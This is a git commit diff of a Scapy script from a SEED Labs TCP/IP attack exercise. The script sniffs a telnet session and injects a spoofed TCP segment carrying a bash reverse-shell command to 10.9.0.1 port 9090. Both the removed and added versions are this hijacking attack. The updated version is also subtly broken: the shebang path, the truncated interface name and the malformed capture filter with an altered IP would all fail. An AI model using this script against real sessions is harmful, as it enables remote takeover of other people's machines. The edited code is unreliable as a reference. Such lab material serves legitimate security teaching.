922745895c128266c18dd87efe40531ee11287ba
Malik Touseef Husnain <55156432+cyberseef@users.noreply.github.com>
2023-09-28 20:41:24 +0500

    Update autohijack_fixed.py

--- SEED 2.0/Network Security Labs/TCP IP Attack Lab 2.0/Code/autohijack_fixed.py
+++ SEED 2.0/Network Security Labs/TCP IP Attack Lab 2.0/Code/autohijack_fixed.py
@@ -1,11 +1,10 @@
+#!usr/bin/env python3
 from scapy.all import *
-
 def spoof_tcp(pkt):
-	ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
-	tcp = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="A", seq=pkt[TCP].ack+5, ack=pkt[TCP].seq)
-	data = "\r /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1 \r"
-	pkt = ip/tcp/data
-	#ls(pkt)
-	send(pkt, iface="br-b4697936b45b", verbose=0)
-	
-pkt=sniff(iface='br-b4697936b45b', filter='tcp and src host 10.9.0.5 and src port 23', prn=spoof_tcp)
+    ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
+    tcp =TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="A", seq=pkt[TCP].ack+5, ack=pkt[TCP].seq+len(pkt[TCP].payload))
+    data = "\r /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1 \r"
+    pkt = ip/tcp/data
+    send(pkt, iface="br-", verbose=0)
+    
+pkt = sniff(iface='br-', filter='tcp = src host 19.9.0.5 and src port 23', prn=spoof_tcp)
